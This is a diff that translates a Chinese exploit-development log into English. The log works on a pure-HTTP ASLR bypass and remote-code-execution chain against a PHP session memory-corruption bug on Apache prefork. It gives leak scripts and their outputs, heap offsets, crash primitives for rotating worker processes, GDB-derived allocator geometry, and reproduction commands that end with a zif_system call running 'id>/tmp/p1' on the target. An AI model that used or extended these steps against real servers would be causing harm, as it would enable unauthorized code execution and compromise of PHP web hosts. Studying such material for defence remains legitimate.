@@ -1,22 +1,18 @@
-# 纯 HTTP ASLR 链：轮换问题研究记录
+# Pure-HTTP ASLR Chain: Worker Rotation Research Notes
 
-日期：2026-10-21
-参考交付：[ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)（别人已跑通 5/5，阶段间用
-SIGSEGV 轮换 worker）
-约束：攻击请求只用 HTTP；**目标 172.16.0.103 上不做任何插桩**（没有 gdb、
-没有 /proc 读取、没有目标侧 PHP）。本文的 gdb 测量全部在**我们自己的校准
-lab 172.16.1.112** 上完成，不接触目标进程。
+Date: 2026-10-21
+Reference result: [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md) (another run achieved 5/5, rotating workers between stages with SIGSEGV)
+Constraints: Attack requests use HTTP only; **no instrumentation is performed on target 172.16.0.103** (no GDB, no /proc reads, no target-side PHP). All GDB measurements in this document were taken on our own calibration lab, 172.16.1.112, without touching the target process.
 
-状态：**地址泄漏与 RCE 终端本身已是纯 HTTP；剩余唯一工程项是“阶段之间如何
-只用一个 HTTP 请求轮换 worker”**。这条还没打通，本文记录阻塞点和下一步。
+Status: **The address leaks and RCE endpoint are already pure HTTP; the only remaining engineering item is how to rotate workers between stages using a single HTTP request.** That has not yet been solved in this research log; this document records the blocker and next steps.
 
 ---
 
-## 1. 已验证（全部在 172.16.0.103，只发 HTTP）
+## 1. Verified (All on 172.16.0.103, HTTP Requests Only)
 
-### 1.1 全新 master 的 stage 2 泄漏
+### 1.1 Stage 2 Leak on a Fresh Master
 
-```text
+~~~text
 $ sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start
 $ python3 send_a_leak3.py 1001 5 39 12 17
 $ python3 b_target.py 443 16 983
@@ -24,72 +20,67 @@ $ python3 b_target.py 443 16 983
 Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%E1%01%A6%7F%00%00; path=/
 pDestructor = 0x7fa601e13c50
 libphp      = 0x7fa601800000   (pDestructor - 0x613c50)
-```
+~~~
 
-`(p & 0x1fffff) == 0x13c50`，libphp 2MB 对齐，泄漏有效。
+`(p & 0x1fffff) == 0x13c50`; libphp is 2 MB aligned, so the leak is valid.
 
-### 1.2 stage 1 + stage 2 可以在**同一个 worker** 上完成
+### 1.2 Stage 1 + Stage 2 Work on the **Same Worker**
 
-```text
+~~~text
 W0=882266
 after A1 W=882266
 after B1 W=882266
 after A2 W=882266
 after B2 W=882266
-```
+~~~
 
-即：
+That is:
 
-1. `send_a_leak2.py 1001 12` + `b_numleak2.py 892 1 0x1000` → chunk base；
-2. 同一 worker 上 `send_a_leak3.py 1001 5 39 12 17` + `b_target.py 443 16 983`
-   → libphp base（仍返回 16 字节 `pDestructor`）。
+1. `send_a_leak2.py 1001 12` + `b_numleak2.py 892 1 0x1000` → chunk base.
+2. On the same worker, `send_a_leak3.py 1001 5 39 12 17` + `b_target.py 443 16 983` → libphp base (still returns the 16-byte `pDestructor`).
 
-这说明“每个阶段都必须换 fresh worker”并不成立，**两个泄漏可以合并到一次
-worker 历史里**，只需要在 stage 3 之前轮换一次。
+This shows that “every stage needs a fresh worker” is not true. **The two leaks can share one worker history; only stage 3 needs a rotation beforehand.**
 
-### 1.3 HTTP 崩溃轮换在**全新 worker**上有效
+### 1.3 HTTP Crash Rotation Works on a **Fresh Worker**
 
-```text
+~~~text
 FRESH W=881054
 after A W=881054
 CRASHED new=881148 at 17
 final W=881148
-```
+~~~
 
-用的就是脚本里的 `rotate()`：
+This uses the driver's `rotate()`:
 
-```text
+~~~text
 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
 send_b_rce2.py 15 2 0x1 0x1 x
-```
+~~~
 
-`send_b_rce2` 的 fake reference 落在 fresh worker 的 `R0-0x10`，`val.value=1`，
-`zend_array_destroy(1)` → SIGSEGV，prefork 立刻 fork 新 worker。
+`send_b_rce2` places the fake reference at `R0-0x10` in a fresh worker; `val.value=1`, so `zend_array_destroy(1)` causes SIGSEGV and prefork forks a new worker immediately.
 
 ---
 
-## 2. 失败点：HTTP rotate 在**服务过泄漏请求的 worker** 上不工作
+## 2. Failure: HTTP Rotation Does Not Work on a Worker That Has Served Leak Requests
 
-### 2.1 官方驱动去掉信号、只用 HTTP rotate 的结果
+### 2.1 Result from the Official Driver with Signals Removed and Only HTTP Rotation
 
-在 .103 上把 `pure_aslr_run.sh` 的 sudo 改成 `sudo -n`，其余不动：
+On .103, the only change to `pure_aslr_run.sh` was replacing sudo with `sudo -n`:
 
-```text
+~~~text
 W1=877061 chunk=0x7f6beba00000 attempt=1
 W2=877299 libphp=0x0 attempt=1
 W2=877349 libphp=0x0 attempt=2
 LIBPHP_LEAK_FAILED
-```
+~~~
 
-阶段 1 成功；HTTP rotate 之后 stage 2 连续两次拿不到 libphp 泄漏
-（`b_target.py` 没有返回 16 字节的 `Set-Cookie`）。
+Stage 1 succeeded. After HTTP rotation, stage 2 failed to obtain the libphp leak twice (`b_target.py` did not return the 16-byte `Set-Cookie`).
 
-### 2.2 直接观察 rotate
+### 2.2 Direct Observation of Rotation
 
-阶段 1 之后，连续 6 次 `send_a_pad + send_b_rce2(HT=1)`，worker pid
-**一次都没变**：
+After stage 1, sent `send_a_pad + send_b_rce2(HT=1)` six times in a row. The worker PID **never changed**:
 
-```text
+~~~text
 PHASE1 W=879429
 no-rotate try=1 W=879429
 ...
@@ -97,162 +88,133 @@ no-rotate try=6 W=879429
 STAGE2 W=879429
 SETCOOKIE_LEN 72
 VALUE Set-Cookie: PHPSESSID=%10...P%3CaP%EA%7F...
-```
+~~~
 
-这组里 stage 2 反而在同 worker 上成功，说明：
+Stage 2 succeeded on the same worker in this run, confirming:
 
-- rotate 的 crash 请求在 used history 上不触发；
-- stage 2 不依赖 fresh worker（与 1.2 一致）。
+- The crash request does not trigger rotation after used history.
+- Stage 2 does not require a fresh worker (consistent with 1.2).
 
 ---
 
-## 3. 根因（在 .112 校准 lab 上的 gdb 测量）
+## 3. Root Cause (GDB Measurements on the .112 Calibration Lab)
 
-> 以下地址都是 no-ASLR lab 的 chunk 相对值；目标是 ASLR，但 chunk 内几何
-> 相同。测量不涉及 172.16.0.103。
+> Addresses below are chunk-relative values from the no-ASLR lab. The target uses ASLR, but the chunk geometry is the same. Measurements did not involve 172.16.0.103.
 
-### 3.1 fresh stage 3 的几何
+### 3.1 Fresh Stage 3 Geometry
 
-- A `send_a_pad 17 19 3 12 6×7:7`：
-  `PS(http_session_vars).value.ref = chunk + 0x24e0`。
-- `R0 - 0x10 = chunk + 0x24d0`，正是 56B bin 的空闲块起点。
-- B `send_b_zif 15 2 ...` 的 55B fake-ref raw 正好落在这里；
-  fake reference 的字段在 raw+0x10，与 `R0` 对齐。
+- A, `send_a_pad 17 19 3 12 6×7:7`: `PS(http_session_vars).value.ref = chunk + 0x24e0`.
+- `R0 - 0x10 = chunk + 0x24d0`, exactly the start of the free 56-byte bin block.
+- B, `send_b_zif 15 2 ...`: the 55-byte fake-reference raw buffer lands here; fake-reference fields begin at raw+0x10 and align with `R0`.
 
-### 3.2 used history 的几何完全不同
+### 3.2 Used-History Geometry Is Different
 
-先在同一 worker 上做 stage 1 + stage 2，再发 stage 3 A：
+First run stages 1 and 2 on the same worker, then send stage 3 A:
 
-| pads P | R0 | R0 所在页 | 该页在 B `track_init` 时的 map |
+| Pads P | R0 | R0 page | Map for that page during B track_init |
 |---|---|---|---|
 | 6 | chunk+0x1560 | page 1 | `0x80000003` = 32B bin |
 | 7 | chunk+0x15c0 | page 1 | `0x80000003` = 32B bin |
-| 45 | chunk+0x7d400 | page 125 | `0xc0030018` = NRUN/大块续页 |
-| 640 | chunk+0x8b320 | page 139 | `0x0` = FRUN 空闲页 |
+| 45 | chunk+0x7d400 | page 125 | `0xc0030018` = NRUN/large-block continuation page |
+| 640 | chunk+0x8b320 | page 139 | `0x0` = free FRUN page |
 
-而 fresh 的 `R0=chunk+0x24e0` 所在页是 56B bin（56B free head 就是
-`chunk+0x24d0`）。
+By comparison, the fresh worker's `R0=chunk+0x24e0` page is a 56B bin page (the 56B free-list head is `chunk+0x24d0`).
 
-结论：
+Conclusions:
 
-1. **used history 下 `R0` 落在 32B bin 的页里**，不是 56B 页；
-2. `send_b_zif` 的 fake-ref raw 是 55B → 56B bin，**无法分配进 32B 页**；
-3. 即使 P 把 `R0` 挪到页对齐的 56B 槽位（例如 P=7 的
-   `R0-0x10=chunk+0x15b0`），该页在 B 时仍然是 32B bin（
-   `map=0x80000003`），56B raw 还是进不来；
-4. P=640 时 `R0` 页甚至是 FRUN（整页空闲），56B bin 的当前 head 仍是
-   `chunk+0x24d0`，分配器不会为了几十个 56B 分配去拿那个高地址空闲页。
+1. **With used history, `R0` lands on a 32B bin page**, not a 56B page.
+2. `send_b_zif`'s 55B fake-reference raw buffer uses the 56B bin and **cannot be allocated into a 32B page**.
+3. Even if P moves `R0` to a 56B-aligned slot (for example, with P=7, `R0-0x10=chunk+0x15b0`), the page is still a 32B bin during B (`map=0x80000003`), so the 56B raw buffer still cannot land there.
+4. At P=640, the `R0` page is FRUN (the whole page is free), but the 56B bin's current head remains `chunk+0x24d0`. The allocator does not take that high-address free page for a few dozen 56B allocations.
 
-### 3.3 used history 的 B 可能根本没走到 track_init
+### 3.3 B May Not Reach track_init at All with Used History
 
-对新 worker（fresh）在 `session.c:481`（`php_session_track_init()` 调用点）
-下断，A+B 会命中并看到 reference。used history（stage 1+2 后，A P=6）
-再下同样的断点、发 B（`b_crash7.py 14`），**一次都没有命中**；
-`php_session_rfc1867_cleanup` / `php_session_initialize` 也没有命中。
+For a fresh worker, a breakpoint at `session.c:481` (the `php_session_track_init()` call) is hit by A+B, and the reference is visible. With used history (after stages 1+2, A with P=6), the same breakpoint was set and B (`b_crash7.py 14`) sent, but it **never hit**. Neither did `php_session_rfc1867_cleanup` or `php_session_initialize`.
 
-这说明 used history 下存在两种可能（取决于 P/时序）：
+This suggests two possible cases with used history, depending on P/timing:
 
-- A 在请求 shutdown 时自己 abort，B 由父进程新 fork 的 worker 处理；
-  新 worker 没有悬空 reference，`track_init` 不会再销毁旧的；
-- 或 B 的 END cleanup 在 `php_session_initialize()` 里提前返回，
-  没走到 `track_init`。
+- A itself aborts during request shutdown, so B is handled by a new worker forked by the parent. The new worker has no dangling reference, so `track_init` cannot destroy it.
+- Or B's END cleanup returns early inside `php_session_initialize()` and never reaches `track_init`.
 
-无论哪种，**fresh stage 3 的假 reference 触发点在 used history 上不成立**。
-这也是为什么 P=50..75 的同 worker 扫描全部 `nop`。
+Either way, **the fake-reference trigger point from fresh stage 3 does not hold with used history**. This is why the same-worker scan for P=50..75 produced only `nop`.
 
 ---
 
-## 4. 纯 HTTP 路径需要什么
+## 4. What the Pure-HTTP Path Needs
 
-要在**不碰目标**的前提下补上最后一块，只有两条路：
+To finish the last step without touching the target, there are two options:
 
-### 4.1 可靠的 HTTP worker 轮换（推荐）
+### 4.1 Reliable HTTP Worker Rotation (Recommended)
 
-把“泄漏”和“利用”分成两个 fresh worker：
+Split leaks and exploitation across fresh workers:
 
-```text
-W1（fresh）: stage 1 + stage 2 泄漏（已验证可同 worker）
-HTTP crash W1 -> W2（fresh，prefork 继承同一 master 的 ASLR）
-W2（fresh）: stage 3 exploit（现有 fresh 参数，已验证）
-```
+~~~text
+W1 (fresh): stage 1 + stage 2 leaks (verified on the same worker)
+HTTP crash W1 -> W2 (fresh; prefork inherits the same master's ASLR)
+W2 (fresh): stage 3 exploit (existing fresh parameters are verified)
+~~~
 
-缺的只是“W1 是 used，如何用 HTTP 让它崩”。现有 `rotate()` 的
-`send_a_pad + send_b_rce2(HT=1)` 只在 fresh worker 有效。
+The missing piece is crashing W1 after it has been used. The current `rotate()` using `send_a_pad + send_b_rce2(HT=1)` works only on a fresh worker.
 
-可尝试的纯 HTTP crash 原语：
+Pure-HTTP crash primitives to try:
 
-1. **`b_crash7`（32B 活字符串）**
-   - 用 N 个 7 字节 value（zend_string 32B）覆盖 used 的 `R0`；
-   - `R0` 是 32B slot，正好匹配 32B value string；
-   - `PS(http_session_vars)` 仍被当作 reference：`h=0` 读成
-     `val.value`，`len=7` 读成 `IS_ARRAY` → `zend_array_destroy(NULL)`
-     崩溃，**不需要 56B 页重分、不受 free-list shadow 影响**。
-   - 阻塞：必须让 B 真正走到 `track_init`，且旧 reference 仍在（used
-     history 上有时是 UNDEF 或 B 被新 worker 处理）。需要按 used history
-     校准 N，并先确认 A 不崩。
-2. **让 A 自身在 shutdown 时确定性 abort**
-   - used history 的 A 有时会 abort（P=50/68 的 `W3=0`），但不可控；
-   - 需要找到一种 A 形状，使 `PS(http_session_vars)` 的 stale 32B 块在
-     heap reset 后必然触发 `zend_mm_panic`，并且 A 的响应已发出。
-3. **找 malformed multipart / Apache 层的确定性崩溃**
-   - 不依赖 PHP 堆布局，纯 HTTP；目前未找到。
+1. **`b_crash7` (32B live string)**
+   - Use N seven-byte values (32B zend_strings) to overwrite used `R0`.
+   - `R0` is a 32B slot, matching a 32B value string.
+   - `PS(http_session_vars)` is still treated as a reference: `h=0` is read as `val.value` and `len=7` as `IS_ARRAY` → `zend_array_destroy(NULL)` crashes. This **does not require rebinning into a 56B page and is not affected by the free-list shadow**.
+   - Blocker: B must reach `track_init` and the old reference must still exist (with used history it may already be UNDEF, or B may be handled by a new worker). Calibrate N for used history and first confirm A does not crash.
+2. **Make A deterministically abort during shutdown**
+   - A sometimes aborts with used history (P=50/68 produced `W3=0`), but this is not controlled.
+   - Find an A shape that reliably makes the stale 32B `PS(http_session_vars)` block trigger `zend_mm_panic` during heap reset, after A's response has been sent.
+3. **Find a deterministic malformed-multipart/Apache crash**
+   - Must use only HTTP and not depend on PHP heap layout. Nothing has been found yet.
 
-### 4.2 不做轮换，直接校准 used-history stage 3
+### 4.2 Skip Rotation and Calibrate Stage 3 Directly for Used History
 
-需要同时解决：
+This requires solving all of the following:
 
-1. `R0` 所在页必须是 56B bin（或换用匹配 32B 的 fake-ref 布局）；
-2. 56B fake raw 必须落到 `R0-0x10` 这个具体 free slot；
-3. A 必须不崩、B 必须走到 `track_init`；
-4. `send_b_zif` 的 fake HT carrier 地址（fresh 是 `chunk+0x6e0d8`）
-   在 used history 下也要重新校准。
+1. The page containing `R0` must be a 56B bin page (or the fake-reference layout must match 32B).
+2. The 56B fake raw buffer must land on the specific free slot at `R0-0x10`.
+3. A must not crash, and B must reach `track_init`.
+4. Recalibrate the fake HT carrier address for `send_b_zif` (fresh worker uses `chunk+0x6e0d8`).
 
-目前 1/3 已有反例（页是 32B、B 不命中），所以这条路成本更高。
+There is already a counterexample to 1/3: the page is 32B and B does not hit the breakpoint. This path is likely more expensive.
 
 ---
 
-## 5. 建议的下一步实验
+## 5. Recommended Next Experiment
 
-优先做 4.1.1（crash7），因为它只需要 **32B 几何**，与 used `R0` 天然匹配：
+Prioritize 4.1.1 (`crash7`) because it needs only **32B geometry**, which naturally matches used `R0`:
 
-1. 在 .112 上固定 used history（stage 1+2 同 worker），A 用 P=6，
-   用 `session.c:481` 断点确认 A 之后 `PS(http_session_vars)` 是否仍是
-   reference（以及 id/send_cookie 状态）；
-2. 如果 A 后 reference 存在，扫 `b_crash7.py N` 的 N，断点看 `R0` 处
-   qword：
-   - `q0 = 0x0000000600000001`（live string，rc=1/type=6）
-   - `q2 = 7`（len=7）
-   - `q3 = 0x0076767676767676`（'v'*7）
-   即命中；
-3. 命中后直接发 `b_crash7.py N`（不带 gdb），确认 worker pid 变化；
-4. 到 .103 上只用 HTTP：
-   - fresh W1: stage 1 + stage 2 泄漏；
-   - `send_a_pad P=6 + b_crash7 N` 轮换；
-   - fresh W2: stage 3 `send_a_pad 6 pads + send_b_zif 15 2 HTDATA ZIF`，
-     地址来自 W1（prefork 继承同一 master 的 ASLR，chunk/libphp base
-     在 worker 重 fork 后保持不变；参考 ASLR_PURE_HTTP.md 第 5 节）。
-5. 如果 crash7 的旧 reference 在 used history 上不存在，退而求其次：
-   让 stage 2 的 B 在泄漏后自己 abort（改 `b_target` 的目标数组布局，
-   使 `zend_string_release_ex(PS(id))` 的 gc/refcount 走 `efree`
-   非法内部指针），这样 W1 在 stage 2 之后自然轮换，W2 直接跑 fresh
-   stage 3。
+1. On .112, reproduce used history (stages 1+2 on one worker), use A with P=6, and set a breakpoint at `session.c:481` to confirm whether `PS(http_session_vars)` is still a reference after A, along with the id/send_cookie state.
+2. If the reference exists after A, scan `b_crash7.py N` and inspect the qwords at `R0`:
+   - `q0 = 0x0000000600000001` (live string, rc=1/type=6)
+   - `q2 = 7` (len=7)
+   - `q3 = 0x0076767676767676` ('v'*7)
+   This indicates a hit.
+3. After a hit, send `b_crash7.py N` without GDB and confirm the worker PID changes.
+4. On .103, use HTTP only:
+   - Fresh W1: stage 1 + stage 2 leaks.
+   - Rotate with `send_a_pad P=6 + b_crash7 N`.
+   - Fresh W2: stage 3 with six pads in `send_a_pad` + `send_b_zif 15 2 HTDATA ZIF`, using addresses from W1 (prefork inherits the master's ASLR, so chunk/libphp bases stay the same after the worker is forked again; see section 5 of ASLR_PURE_HTTP.md).
+5. If the old reference does not exist after A with used history, next try to make stage 2 B abort after its leak. Change `b_target`'s target-array layout so `zend_string_release_ex(PS(id))` reaches `efree` on an invalid internal pointer; W1 then rotates naturally after stage 2, and fresh W2 can run stage 3.
 
 ---
 
-## 6. 复现命令（.103，纯 HTTP；无 gdb/maps）
+## 6. Reproduction Commands (.103, Pure HTTP; No GDB/maps)
 
-```bash
-# 1) fresh master
+~~~bash
+# 1) Fresh master
 sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start; sleep 0.5
 
-# 2) W1: chunk leak + libphp leak 同 worker
+# 2) W1: chunk and libphp leaks on the same worker
 python3 send_a_leak2.py 1001 12; sleep 0.2
 python3 b_numleak2.py 892 1 0x1000; sleep 0.2
 python3 send_a_leak3.py 1001 5 39 12 17; sleep 0.2
 python3 b_target.py 443 16 983
-# 解析 /tmp/b_numleak2.resp -> chunk, /tmp/b_target.resp -> pDestructor
+# Parse /tmp/b_numleak2.resp -> chunk; /tmp/b_target.resp -> pDestructor
 
-# 3) 纯 HTTP 轮换（待校准的 N）
+# 3) Pure-HTTP rotation (N still needs calibration)
 python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
 python3 b_crash7.py <N>
 
@@ -260,30 +222,26 @@ python3 b_crash7.py <N>
 HT=$(chunk+0x6e0d8); ZIF=$(libphp+0x43a870)
 python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
 python3 send_b_zif.py 15 2 $HT $ZIF 'id>/tmp/p1'
-```
+~~~
 
 ---
 
-## 7. 文件
+## 7. Files
 
-| 文件 | 用途 |
+| File | Purpose |
 |---|---|
-| `tools/b_crash7.py` | 32B live-string 崩溃原语（待校准 N） |
-| `tools/refq2.gdb` / `flow.gdb` | .112 上用来看 used-history 的 reference/track_init 流程 |
-| `tools/pagemap.gdb` | .112 上读 R0 页的 `chunk->map` / free_slot |
-| `tools/send_b_probe.py` / `b_probe_long.py` | fake-ref 落点探针 |
-| `tools/same_worker_trials.py` | 同 worker stage 3 P 扫描（.112） |
-| `tools/pure_aslr_run.sh` | 别人的驱动（含 HTTP rotate，used 上不稳定） |
+| `tools/b_crash7.py` | 32B live-string crash primitive (N still needs calibration) |
+| `tools/refq2.gdb` / `flow.gdb` | Inspect used-history reference/track_init flow on .112 |
+| `tools/pagemap.gdb` | Read R0 page `chunk->map` / `free_slot` on .112 |
+| `tools/send_b_probe.py` / `b_probe_long.py` | Probe fake-reference landing point |
+| `tools/same_worker_trials.py` | Same-worker stage 3 P scan (.112) |
+| `tools/pure_aslr_run.sh` | Earlier driver (includes HTTP rotation, which is unstable on used workers) |
 
 ---
 
-## 8. 结论
+## 8. Conclusion
 
-- **攻击请求、两条地址泄漏、`zif_system` 终端都已经是纯 HTTP**；
-- 录制的 5/5 里阶段间轮换用的是 SIGSEGV；脚本里的 HTTP `rotate()`
-  只在 fresh worker 上可靠，在服务过泄漏的 worker 上不触发；
-- used history 的根因是 `R0` 落在 32B bin 页，而 fresh stage 3 的
-  fake-ref raw 是 56B bin；页未重分，落点几何不成立；
-- 最短的补齐路径是：**stage 1+2 同 worker → 用 `b_crash7`（32B）做
-  纯 HTTP crash → fresh W2 跑现有 stage 3**。crash7 的 N 需要按
-  used history 校准，并且要先确认 A 之后旧 reference 仍在。
+- **The attack requests, both address leaks, and `zif_system` endpoint are all pure HTTP.**
+- The recorded 5/5 run used SIGSEGV to rotate between stages. The script's HTTP `rotate()` is reliable only on a fresh worker and does not trigger after leak requests have been served.
+- With used history, `R0` lands on a 32B bin page, while the fresh stage 3 fake-reference raw buffer uses a 56B bin. The page was not rebinned, so the landing geometry does not work.
+- The shortest path to completion is: **stage 1+2 on one worker → pure-HTTP crash with `b_crash7` (32B) → existing stage 3 on fresh W2**. Calibrate crash7's N for used history and first verify that A leaves the old reference intact.
